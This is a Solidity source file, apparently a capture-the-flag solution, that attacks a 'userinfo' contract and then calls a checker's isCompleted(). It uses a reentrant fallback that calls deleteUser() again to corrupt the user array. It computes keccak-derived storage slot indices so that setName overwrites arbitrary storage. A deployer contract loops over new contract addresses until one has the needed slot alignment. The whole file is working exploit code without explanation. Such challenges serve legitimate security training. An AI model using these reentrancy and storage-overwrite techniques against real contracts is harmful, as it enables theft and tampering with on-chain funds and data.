pragma solidity ^0.4.24;
import "./userinfo.sol";
contract userinfoAttack{
    check public che;
    userinfo public info;
    uint256 public times;
    constructor(address _che)public{
        che = check(_che);
        info = che.info();
    }

    function add(string _name)internal {
        info.addUser.value(msg.value)(_name);
    }
    function deleteU()internal{
        info.deleteUser();
    }
    function setN(uint256 index,string memory name)internal{
        info.setName(index,name);
    }

    function init()public{
        add("a");
        deleteU();

    }
    function att1()public{
        setN(fig2(address(this)),"");
    }

    function att2()public{
        setN(fig5(address(this)),"sbgzx");
    }
    function complete()public{
        che.isCompleted();
    }
    function()external payable{
        if(times<2){
            times+=1;
            info.deleteUser();
        }
    }

    function arrayStart(address _addr)public pure returns(bytes32){
        return keccak256(bytes32(_addr),uint256(2));
    }
    function arrayEle(address _addr) public pure returns(bytes32){
        return keccak256(arrayStart(_addr));
    }
    function fig1(address _addr)public pure returns(uint256){
        return (uint256(-1)-uint256(arrayEle(_addr))+1)%2;
    }
    function fig2(address _addr)public pure returns(uint256){
        return (uint256(-1)-uint256(arrayEle(_addr))+1)/2;
    }
    function fig3(address _addr)public pure returns(bytes32){
        return keccak256(bytes32(_addr),uint256(1));
    }
    function fig4(address _addr)public pure returns(uint256){
        return (uint256(fig3(_addr))-uint256(arrayEle(_addr)))%2;
    }
    function fig5(address _addr)public pure returns(uint256){
        return (uint256(fig3(_addr))-uint256(arrayEle(_addr)))/2;
    }
}

contract deploy{
    userinfoAttack public user;
    function arrayStart(address _addr)public pure returns(bytes32){
        return keccak256(bytes32(_addr),uint256(2));
    }
    function arrayEle(address _addr) public pure returns(bytes32){
        return keccak256(arrayStart(_addr));
    }
    function fig1(address _addr)public pure returns(uint256){
        return (uint256(-1)-uint256(arrayEle(_addr))+1)%2;
    }
    function fig2(address _addr)public pure returns(uint256){
        return (uint256(-1)-uint256(arrayEle(_addr))+1)/2;
    }
    function fig3(address _addr)public pure returns(bytes32){
        return keccak256(bytes32(_addr),uint256(1));
    }
    function fig4(address _addr)public pure returns(uint256){
        return (uint256(fig3(_addr))-uint256(arrayEle(_addr)))%2;
    }
    function fig5(address _addr)public pure returns(uint256){
        return (uint256(fig3(_addr))-uint256(arrayEle(_addr)))/2;
    }

    function dep(address _addr)public{
        for(uint i=0;i<999;i++){
           userinfoAttack _user = new userinfoAttack(_addr);
            if (fig1(address(_user)) ==0&& fig4(address(_user))==0){
                user = _user;
                break;
            }
        }
        
    }
}
